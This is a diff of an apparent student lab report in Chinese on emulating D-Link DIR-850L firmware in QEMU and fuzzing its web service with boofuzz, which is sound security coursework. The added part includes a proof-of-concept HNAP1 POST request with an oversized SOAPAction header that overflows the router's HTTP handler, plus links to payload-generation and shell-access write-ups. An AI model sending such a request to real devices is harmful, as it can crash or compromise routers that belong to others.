@@ -3,14 +3,14 @@
 ## 实验要求
 - [x] 搜集市面上主要的路由器厂家,在厂家的官网中寻找可下载的固件在CVE漏洞数据中查找主要的家用路由器厂家的已经公开的漏洞，选择一两个能下载到切有已经公开漏洞的固件。
 - [x] 如果能下载对应版本的固件，在QEMU中模拟运行。确定攻击面（对哪个端口哪个协议进行Fuzzing测试），尽可能多的抓取攻击面正常的数据包（wireshark）
-- [] 查阅BooFuzz的文档，编写这对这个攻击面，这个协议的脚本，进行Fuzzing。配置BooFuzz QEMU的崩溃异常检测，争取触发一次固件崩溃，获得崩溃相关的输入测试样本和日志。
+- [x] 查阅BooFuzz的文档，编写这对这个攻击面，这个协议的脚本，进行Fuzzing。配置BooFuzz QEMU的崩溃异常检测，争取触发一次固件崩溃，获得崩溃相关的输入测试样本和日志。
 - [] 尝试使用调试器和IDA-pro监视目标程序的崩溃过程，分析原理。
 ## 实验环境
 ubuntu-16.04-desktop
 ## 实验步骤
 ### 一、固件下载并提取
 1. 固件准备。  
-固件下载地址：[DIR 850l-Download direct](http://files.dlink.com.au/products/DIR-850L)，下载dir-850l-REV_A
+固件下载地址：[DIR 850l-Download direct](http://files.dlink.com.au/products/DIR-850L)，下载dir-850l-REV_A，固件名称： DIR850LA1_FW114WWb07.bin
 ```
 # 物理机上操作：
 scp DIR850LA1_FW114WWb07.bin mudou@192.168.57.117:/home/mudou/dir-850l/
@@ -92,71 +92,6 @@ firmadyne_path=/home/attify/firmadyne # address of firmadyne
 ![](images/fat-ok.png)   
 [默认用户名Admin,默认密码为空.](http://support.routercheck.com/D-Link/DIR-850L/DefaultPassword-3.html)
 
-### 2-2.2：模拟运行方式二 --- （system mode）qemu安装mips虚拟机
-* [QEMU System Emulator Targets](https://www.qemu.org/docs/master/system/targets.html)
-* [MIPS System emulator](https://www.qemu.org/docs/master/system/target-mips.html)
-* [How to build a Debian MIPS image on QEMU](https://markuta.com/how-to-build-a-mips-qemu-image-on-debian/) 
-* [MIPS环境填坑指南](https://zhuanlan.zhihu.com/p/110365843) 
-* [Emulating Embedded Linux Devices with QEMU](https://www.novetta.com/2018/02/emulating-embedded-linux-devices-with-qemu/)
-* [QEMU System Emulation User’s Guide](https://www.qemu.org/docs/master/system/index.html)
-
-* [Fuzzing Embedded Linux Devices](https://www.novetta.com/2018/07/fuzzing-embedded-linux-devices/)  
-* [Emulating Embedded Linux Devices with QEMU](https://www.novetta.com/2018/02/emulating-embedded-linux-devices-with-qemu/)  
-* [Emulating Embedded Linux Systems with QEMU](https://www.novetta.com/2018/02/emulating-embedded-linux-systems-with-qemu/)
-* [Dynamic Analysis of Firmware Using Firmadyne](https://opensourceforu.com/2018/09/dynamic-analysis-of-firmware-using-firmadyne/)  
-* [D-Link: A Firmware Security Analysis – Part 2](https://www.refirmlabs.com/d-link-a-firmware-security-analysis-part-2/)
-* [D-Link: A Firmware Security Analysis – Part 3](https://www.refirmlabs.com/d-link-a-firmware-security-analysis-part-3/)
-* [D-Link: A Firmware Security Analysis – Part 4](https://www.refirmlabs.com/d-link-a-firmware-security-analysis-part-4/)
-* [Getting started with Firmware Emulation for IoT Devices](https://blog.attify.com/getting-started-with-firmware-emulation/) 
-* [DLink RCE 漏洞 CVE-2019-17621 分析](https://www.geekmeta.com/article/1292672.html) 
-* [IoT安全：调试环境搭建教程(MIPS篇)](https://bbs.pediy.com/thread-229583.htm)
-* [在QEMU MIPS虚拟机上运行MIPS程序（ssh方式](http://zeroisone.cc/2018/03/20/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#qemu%E6%A8%A1%E6%8B%9Fmips%E7%A8%8B%E5%BA%8F)
-* [DLink RCE漏洞CVE-2019-17621分析](https://www.freebuf.com/vuls/228726.html)
-* [使用QEMU配置一台虚拟MIPS系统](https://blog.sbw.so/u/create-mips-virtual-machine-in-qemu.html)
-* [路由器逆向分析------在QEMU MIPS虚拟机上运行MIPS程序（ssh方式）](https://blog.csdn.net/QQ1084283172/article/details/69652258)
-* [详细的路由器漏洞分析环境搭建教程](https://chuansongme.com/n/864762852648)
-* [路由器固件安全分析技术（一）](https://www.vulbox.com/knowledge/detail/?id=35%20%20)
-* [路由器固件安全分析技术（二）](https://www.vulbox.com/knowledge/detail/?id=42%20)
-* [msfvenom生成各类Payload命令](https://www.huo119.com/post/909.shtm)
-1. 查看qemu版本信息```qemu-img --version```  
-![](images/qemu-version.png)
-2. 使用debian开发人员做好的镜像，其中已经包含了debian的squeeze版,下载[debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta](https://people.debian.org/~aurel32/qemu/mips/),使用scp拷贝到虚拟机中。  
-
-3. 配置
-```
-# 安装依赖
-sudo apt-get install bridge-utils uml-utilities
-
-# 修改ubuntu主机网络配置
-sudo vim /etc/network/interfaces
-# change as follows:
-auto lo
-iface lo inet loopback
- 
-# ubuntu 16.04的系统用ens33代替eth0
-auto ens33
-iface ens33 inet manual
-up ifconfig ens33 0.0.0.0 up
- 
-auto br0
-iface br0 inet dhcp
-bridge_ports ens33
-bridge_stp off
-bridge_maxwait 1
-
-
-# 修改QEMU的网络接口启动脚本，重启网络使配置生效
-sudo vim /etc/qemu-ifup
-# as follows:
-#!/bin/sh
-echo "Executing /etc/qemu-ifup"
-echo "Bringing $1 for bridged mode..."
-sudo /sbin/ifconfig $1 0.0.0.0 promisc up
-echo "Adding $1 to br0..."
-sudo /sbin/brctl addif br0 $1
-sleep 3
-```
-
 ### 三、fuzzing
 * 参考：  
 [boofuzz: Network Protocol Fuzzing for Humans](https://boofuzz.readthedocs.io/en/stable/)    
@@ -193,6 +128,35 @@ sudo pip install .
 * [quickstart](https://boofuzz.readthedocs.io/en/stable/user/quickstart.html)
 * [使用boofuzz进行漏洞挖掘(一)](https://www.freebuf.com/column/185606.html)
 * [使用boofuzz进行漏洞挖掘(二)](https://www.freebuf.com/column/185658.html)
+修改example/ftp_simple.py中的地址为192.168.0.1，端口80，```python ftp_simple.py```看到确实路由器一开始没有设置用户名和密码。  
+![](images/noname.png)
+然后进入'127.0.0.1:26000'查看当前fuzzing进度。  
+![](images/fuzzing-process.png)  
+参考[iot学习-DIR-850L漏洞分析](https://xz.aliyun.com/t/5362) 编写Poc如下：  
+```
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:49.0) Gecko/20100101
+Firefox/49.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml; charset=utf-8
+SOAPAction:
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAA
+HNAP_AUTH: BBD0605AF8690024AF8568BE88DD7B8E 1482588069
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.0.1/info/Login.html
+Content-Length: 306
+Cookie: uid=kV8BSOXCoc
+Connection: close
+```
 ### 四、调试分析
 1. 安装gdb
 ```
@@ -396,9 +360,76 @@ rabin2 -l ./bin/busybox
 mips 是32位大端字节序   
 mipsel 是32位小端字节序   
 mips64el 是64位小端字节序 
+### 8.---2-2.2：模拟运行方式二 --- （system mode）qemu安装mips虚拟机
+* 完成到一半，先交作业，在这里总结出已学习的内容
+* [QEMU System Emulator Targets](https://www.qemu.org/docs/master/system/targets.html)
+* [MIPS System emulator](https://www.qemu.org/docs/master/system/target-mips.html)
+* [How to build a Debian MIPS image on QEMU](https://markuta.com/how-to-build-a-mips-qemu-image-on-debian/) 
+* [MIPS环境填坑指南](https://zhuanlan.zhihu.com/p/110365843) 
+* [Emulating Embedded Linux Devices with QEMU](https://www.novetta.com/2018/02/emulating-embedded-linux-devices-with-qemu/)
+* [QEMU System Emulation User’s Guide](https://www.qemu.org/docs/master/system/index.html)
+
+* [Fuzzing Embedded Linux Devices](https://www.novetta.com/2018/07/fuzzing-embedded-linux-devices/)  
+* [Emulating Embedded Linux Devices with QEMU](https://www.novetta.com/2018/02/emulating-embedded-linux-devices-with-qemu/)  
+* [Emulating Embedded Linux Systems with QEMU](https://www.novetta.com/2018/02/emulating-embedded-linux-systems-with-qemu/)
+* [Dynamic Analysis of Firmware Using Firmadyne](https://opensourceforu.com/2018/09/dynamic-analysis-of-firmware-using-firmadyne/)  
+* [D-Link: A Firmware Security Analysis – Part 2](https://www.refirmlabs.com/d-link-a-firmware-security-analysis-part-2/)
+* [D-Link: A Firmware Security Analysis – Part 3](https://www.refirmlabs.com/d-link-a-firmware-security-analysis-part-3/)
+* [D-Link: A Firmware Security Analysis – Part 4](https://www.refirmlabs.com/d-link-a-firmware-security-analysis-part-4/)
+* [Getting started with Firmware Emulation for IoT Devices](https://blog.attify.com/getting-started-with-firmware-emulation/) 
+* [DLink RCE 漏洞 CVE-2019-17621 分析](https://www.geekmeta.com/article/1292672.html) 
+* [IoT安全：调试环境搭建教程(MIPS篇)](https://bbs.pediy.com/thread-229583.htm)
+* [在QEMU MIPS虚拟机上运行MIPS程序（ssh方式](http://zeroisone.cc/2018/03/20/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#qemu%E6%A8%A1%E6%8B%9Fmips%E7%A8%8B%E5%BA%8F)
+* [DLink RCE漏洞CVE-2019-17621分析](https://www.freebuf.com/vuls/228726.html)
+* [使用QEMU配置一台虚拟MIPS系统](https://blog.sbw.so/u/create-mips-virtual-machine-in-qemu.html)
+* [路由器逆向分析------在QEMU MIPS虚拟机上运行MIPS程序（ssh方式）](https://blog.csdn.net/QQ1084283172/article/details/69652258)
+* [详细的路由器漏洞分析环境搭建教程](https://chuansongme.com/n/864762852648)
+* [路由器固件安全分析技术（一）](https://www.vulbox.com/knowledge/detail/?id=35%20%20)
+* [路由器固件安全分析技术（二）](https://www.vulbox.com/knowledge/detail/?id=42%20)
+* [msfvenom生成各类Payload命令](https://www.huo119.com/post/909.shtm)
+1. 查看qemu版本信息```qemu-img --version```  
+![](images/qemu-version.png)
+2. 使用debian开发人员做好的镜像，其中已经包含了debian的squeeze版,下载[debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta](https://people.debian.org/~aurel32/qemu/mips/),使用scp拷贝到虚拟机中。  
+
+3. 配置
+```
+# 安装依赖
+sudo apt-get install bridge-utils uml-utilities
+
+# 修改ubuntu主机网络配置
+sudo vim /etc/network/interfaces
+# change as follows:
+auto lo
+iface lo inet loopback
+ 
+# ubuntu 16.04的系统用ens33代替eth0
+auto ens33
+iface ens33 inet manual
+up ifconfig ens33 0.0.0.0 up
+ 
+auto br0
+iface br0 inet dhcp
+bridge_ports ens33
+bridge_stp off
+bridge_maxwait 1
+
+
+# 修改QEMU的网络接口启动脚本，重启网络使配置生效
+sudo vim /etc/qemu-ifup
+# as follows:
+#!/bin/sh
+echo "Executing /etc/qemu-ifup"
+echo "Bringing $1 for bridged mode..."
+sudo /sbin/ifconfig $1 0.0.0.0 promisc up
+echo "Adding $1 to br0..."
+sudo /sbin/brctl addif br0 $1
+sleep 3
+```
 
 ### 本次实验心得
 1. 做实验的过程中，没有思路，或者忘了方法，回头看看老师曾经说了什么。
+## 实验效果
+[fuzzing实验](https://www.bilibili.com/video/BV1BK4y1e7oG)
 ## 参考文献
 [boofuzz: Network Protocol Fuzzing for Humans](https://boofuzz.readthedocs.io/en/stable/)  
 [QEMU](https://www.qemu.org/)  
@@ -412,6 +443,10 @@ mips64el 是64位小端字节序
 [路由器漏洞复现分析第二弹：CNVD-2018-01084 ](https://www.freebuf.com/vuls/162627.html)  
 [D-Link系列路由器漏洞挖掘入门](https://paper.seebug.org/429/)  
 [D-Link DIR-850L 路由器漏洞验证报告](https://gorgias.me/2017/08/11/D-Link-DIR-850L-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%8A%A5%E5%91%8A/)   
-[D-Link DIR-850L路由器分析之获取设备shell](https://cq674350529.github.io/2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/)  [一个路由器竟然被曝10个零日漏洞](https://www.aqniu.com/threat-alert/28078.html)   
+[D-Link DIR-850L路由器分析之获取设备shell](https://cq674350529.github.io/2019/03/18/D-Link-DIR-850L%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%86%E6%9E%90%E4%B9%8B%E8%8E%B7%E5%8F%96%E8%AE%BE%E5%A4%87shell/)    
+[一个路由器竟然被曝10个零日漏洞](https://www.aqniu.com/threat-alert/28078.html)   
 [Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol](https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html)  
+关于fuzzing非常有用的总结文章：  
+[fuzzing-stuff](https://github.com/alphaSeclab/fuzzing-stuff)  
+[OWASP 固件安全性测试指南 ](https://www.anquanke.com/post/id/202942#h2-0)
 
